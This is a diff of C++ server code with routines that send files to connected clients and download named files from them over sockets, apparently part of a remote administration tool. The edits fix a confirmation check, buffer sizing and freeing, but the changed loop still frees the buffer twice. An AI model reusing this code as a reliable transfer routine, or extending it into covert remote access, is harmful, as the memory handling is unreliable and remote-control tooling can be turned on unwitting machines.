@@ -48,50 +48,53 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	strCmdLine.append(1, '@');
 	strCmdLine.append(strRemoteFile);
 	strCmdLine.append(1, '@');
-	strCmdLine.append(3, 'A'); //junk to the end
+	strCmdLine.append(3, 'A'); //junk to the end mayde randomize letters?
 	std::cout<<"Comand "<<strCmdLine<<'\n';
 	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
 		//sleep(1);
 		char *tmpBuffer = nullptr;
-		if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 0){
+		if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 2){
 			std::cout<<"Response "<<tmpBuffer<<'\n';
-			if(strcmp(tmpBuffer, CommandCodes::cFileTranferBegin) != 0){
+			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
+				std::cout<<"Received confirmation\n";
+			} else {
 				std::cout<<"Not confirmed, cancel transfer...\n";
 				strmInputFile.close();
-				Misc::Free(tmpBuffer);
+				Misc::Free(tmpBuffer, 0);
 				return false;
 			}
 		} else {
 			std::cout<<"Didnt receive confirmation from client\n";
 			error();
 			strmInputFile.close();
-			Misc::Free(tmpBuffer);
+			Misc::Free(tmpBuffer, 0);
 		}
-		Misc::Free(tmpBuffer);
+		Misc::Free(tmpBuffer, 0);
 		char *cFileBuffer = nullptr;
+		cFileBuffer = new char[iBlockSize];
 		int iTmp = 0;
-		while(1){
-			cFileBuffer = new char[iBlockSize];
+		while(uBytesSent<=uFileSize /*1*/){
 			strmInputFile.read(cFileBuffer, iBlockSize);
 			iTmp = strmInputFile.gcount();
 			if(iTmp > 0){
-				iBytes = send(Clients[iClientID]->sckSocket, cFileBuffer, iBlockSize, 0);
+				iBytes = send(Clients[iClientID]->sckSocket, cFileBuffer, iTmp, 0);
 				if(iBytes > 0){
 					uBytesSent += iBytes;
 					Misc::ProgressBar(uBytesSent, uFileSize);
 					std::fflush(stdout);
 				} else {
 					std::cout<<"Unable to send file bytes\n";
+					Misc::Free(cFileBuffer, iBlockSize);
 					error();
 					break; //no bytes readed end?
 				}
 			} else {
-				//Misc::Free(cFileBuffer);
+				Misc::Free(cFileBuffer, iBlockSize);
 				break;
 			}
 		}
-		std::cout<<"\nTransfer done\n";
-		Misc::Free(cFileBuffer);
+		std::cout<<"\nTransfer done "<<uBytesSent<<" bytes\n";
+		Misc::Free(cFileBuffer, iBlockSize);
 	} else {
 		std::cout<<"Unable to send command to client\n";
 		error();
@@ -130,13 +133,13 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 		if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
 			if(strcmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel) == 0){
 				std::cout<<"Unable to download remote file\n";
-				Misc::Free(cFileSizeBuffer);
+				Misc::Free(cFileSizeBuffer, 0);
 				return false;
 			}
 			tkToken = cFileSizeBuffer;
 			tkToken += 2;
 			sscanf(tkToken, "%llui", &uFinalSize);
-			Misc::Free(cFileSizeBuffer);
+			Misc::Free(cFileSizeBuffer, 0);
 			std::cout<<"File size is "<<uFinalSize<<'\n';
 			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
 			if(!strmOutputFile.is_open()){
@@ -159,12 +162,12 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 				std::cout<<"\nTransfer done!\n";
 			}
 		} else {
-			Misc::Free(cFileBuffer);
+			Misc::Free(cFileBuffer, iBufferSize);
 			std::cout<<"Unable to receive remote filesize\n";
 			error();
 			return false;
 		}
-		Misc::Free(cFileBuffer);
+		Misc::Free(cFileBuffer, iBufferSize);
 	} else {
 		std::cout<<"Unable to send command to client\n";
 		error();
